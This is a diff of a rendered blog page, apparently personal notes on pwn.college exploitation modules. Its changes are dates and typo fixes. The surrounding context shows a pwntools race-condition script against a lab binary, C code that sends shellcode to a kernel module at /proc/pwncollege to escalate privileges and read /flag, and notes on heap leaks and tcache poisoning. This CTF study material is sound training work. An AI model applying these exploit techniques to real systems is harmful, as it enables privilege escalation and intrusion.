@@ -54,7 +54,7 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220625205927958.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/13160I313S.jpg">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-07-28T13:44:51.008Z">
+<meta property="article:modified_time" content="2022-08-13T06:38:44.390Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -290,7 +290,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年7月28日 晚上
+                  不可视境界线最后变动于：2022年8月13日 下午
                 
               </p>
             
@@ -1926,7 +1926,7 @@
 </ul>
 <p>how to write script….</p>
 <ul>
-<li>two connections. one send <code>send_redacted_flag -&gt; receive_message</code> sequence, another send <code>send_message</code> with <code>&#39;whatthefuckisthat&#39;</code> continuously(or separated by space in a longlonglong bytestring).</li>
+<li>two connections. one sends <code>send_redacted_flag -&gt; receive_message</code> sequence, another sends <code>send_message</code> with <code>&#39;whatthefuckisthat&#39;</code> continuously(or separated by space in a longlonglong bytestring).</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> pwn<br><br>process = pwn.process(<span class="hljs-string">&#x27;./babyrace_level9.1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">work</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote:<br>        pwn.info(remote.recvline().decode())<br>        remote.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &#x27;</span> * <span class="hljs-number">10000</span>)<br>        pwn.info(remote.clean().decode())<br><br><span class="hljs-keyword">with</span> concurrent.futures.ProcessPoolExecutor(<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> pool:<br>    thread = []<br>    thread.append(pool.submit(work, <span class="hljs-string">&#x27;send_redacted_flag receive_message&#x27;</span>))<br>    thread.append(pool.submit(work, <span class="hljs-string">&#x27;send_message whatthefuck&#x27;</span>))<br>    concurrent.futures.wait(thread)<br></code></pre></div></td></tr></table></figure>
 
@@ -2202,7 +2202,7 @@
 <blockquote>
 <p>ATTENTION:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">call    __x86_indirect_thunk_rax ; PIC mode<br></code></pre></div></td></tr></table></figure>
-<p>this is a <em>call</em> instruction, so there is no need for fixing stack context in shellcode. Just simply add ret in the end of it is enough.</p>
+<p>this is a <em>call</em> instruction, so there is no need for fixing stack context in shellcode. Just simply add ret at the end of it is enough.</p>
 </blockquote>
 <p>this module has local variable space on stack(and canary), so we can use the rdi to restore the stack context and make <code>ret</code> work normally.</p>
 <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//shellcode is also the same.</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;...&quot;</span>;<br><span class="hljs-keyword">int</span> len = <span class="hljs-number">264</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br>    <span class="hljs-keyword">void</span>* addr <span class="hljs-comment">/* =? */</span>;<br>&#125;test;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">memcpy</span>(test.buf, shellcode, <span class="hljs-number">256</span>);<br>    test.addr = (<span class="hljs-keyword">void</span>*)...;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    write(fd, &amp;test, <span class="hljs-number">264</span>);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>
@@ -2327,7 +2327,7 @@
 <p><strong>why would the printf print out the null bytes??????</strong> Im so confused. </p>
 <p>ohhhh, i think i get the point. before the printf prints out a string, it will check the string length by locating the null byte. and then it will call the write syscall to prints out all bytes(such as null byte).  but in race condition, with previously filled AAAAAAAABBBBBBBB, after passing the length check, now printf is scheduled to free.  then the ‘string’ is a tcache_perthread_ptr, the write syscall will directly prints it out.</p>
 </blockquote>
-<p><del>but we can’t read the null byte in, nor the white characters</del>.<b style="color:red">we can scanf null bytes into the buffer. the scanf simply adds a \0 to the end of the string, without checking whether there are null bytes in it </b>.what a surprise.</p>
+<p><del>but we can’t read the null byte in, nor the white characters</del>.<b style="color:red">we can scanf null bytes into the buffer. the scanf simply adds a \0 to the end of the string, without checking whether there are null bytes in it </b>. what a surprise.</p>
 <p><strong>Again, i forgot the libc version on my kali is 2.33. stucked in why tcache poisoning don’t work, neglected the PROTECT_PTR macro.</strong> </p>
 <p>but i figure out that the chunk 0 is at a constant offset from the tcache_perthread_struct address, which is 0x650. the tcache link at the end of controlled_allocation is like this: <code>tcache_entry[i]-&gt;chunk_0-&gt;packed address</code> </p>
 <img src="../../image/pwn-modules/image-20220619123546515.png" srcset="/img/loading.gif" lazyload alt="image-20220619123546515" style="zoom:80%;" />
